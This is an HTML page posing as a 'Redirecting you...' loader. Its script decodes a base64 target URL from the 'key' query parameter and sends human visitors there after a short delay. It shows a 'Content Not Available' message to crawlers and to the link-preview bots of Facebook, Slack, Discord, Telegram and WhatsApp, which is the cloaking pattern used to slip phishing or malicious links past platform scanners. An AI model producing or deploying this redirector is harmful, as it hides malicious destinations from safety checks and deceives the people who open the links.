<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow">

  <!-- Bootstrap 5 -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background: linear-gradient(145deg, #e2e8f0, #f8fafc);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', sans-serif;
    }

    .card {
      max-width: 420px;
      padding: 30px;
      border-radius: 1.25rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      background: white;
      text-align: center;
    }

    .spinner-border {
      width: 3rem;
      height: 3rem;
      margin-bottom: 20px;
      color: #0d6efd;
    }
  </style>
</head>
<body>

<div class="card">
  <div id="loader">
    <div class="spinner-border" role="status"></div>
    <h4 class="mt-3" id="status-title">Redirecting you...</h4>
    <p id="status-text">Please wait a moment.</p>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const encoded = urlParams.get("key");

  const botPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /facebookexternalhit/i,
    /facebot/i,
    /slackbot/i,
    /discord/i,
    /telegram/i,
    /whatsapp/i,
    /preview/i
  ];

  const ua = navigator.userAgent;
  let isBot = false;

  for (let pattern of botPatterns) {
    if (pattern.test(ua)) {
      isBot = true;
      break;
    }
  }

  const title = document.getElementById("status-title");
  const text = document.getElementById("status-text");

  if (!encoded) {
    title.innerText = "Invalid Link";
    text.innerText = "The link appears broken or incomplete.";
  } else if (isBot) {
    title.innerText = "Content Not Available";
    text.innerText = "Please open this link manually in your browser.";
    document.querySelector('.spinner-border').style.display = "none";
  } else {
    // Delay for human then redirect
    setTimeout(() => {
      const targetUrl = atob(encoded);
      window.location.href = targetUrl;
    }, 2500);
  }
</script>

</body>
</html>
